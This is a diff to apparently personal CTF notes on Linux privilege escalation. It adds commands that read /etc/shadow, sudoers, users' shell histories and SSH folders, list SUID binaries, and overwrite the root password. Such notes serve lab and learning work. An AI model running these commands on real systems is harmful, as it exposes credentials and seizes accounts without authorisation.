@@ -66,21 +66,31 @@ stty raw -echo && fg
 whoami
 id #default groups: audio video plugdev cdrom dip floppy netdev
 groups
-cat .bash_history
 uname -a
+cat /etc/sudoers
+cat */.bash_history
+cat */.bashrc
+cat /etc/sudoers
+cat /etc/sudoers.d
+cat /etc/crontab
+cat /var/spool/*
+cat /etc/systemd/system
+cat */.ssh/
+cat /opt/
+cat /etc/passwd
+cat /etc/shadow
 
 ss -tln #identify localports
 ss -tla #identify name
 
 find / -user root -perm /4000 2>/dev/null
 find / -type f -perm -04000 -ls 2>/dev/null #find tools that have an suid, look these up on https://gtfobins.github.io/
+chmod -s {found_binary} # to disallow others from abusing it
 
 pspy32 #spy tool, open it on a host, login on second terminal, and maybe gain stuff
+echo -e "hackerpassword\nhackerpassword" | passwd root
 
-cd C:\Program Files (x86)
-dir
-
-PrivescCheck.ps1
+grep -r "THM{" / >> temp_flags.txt 2>/dev/null
 
 ### sudo -L
 https://gtfobins.github.io/#+sudo
@@ -98,6 +108,11 @@ john --format=gpg --wordlist=/usr/share/wordlist/rockyou.txt hash
 gpg --import {file}.asc
 gpg --decrypt {file}.gpg
 
+### windows
+cd C:\Program Files (x86)
+dir
+
+PrivescCheck.ps1
 
 ## cracking hashes
 zip2john file.zip>{hashfile}
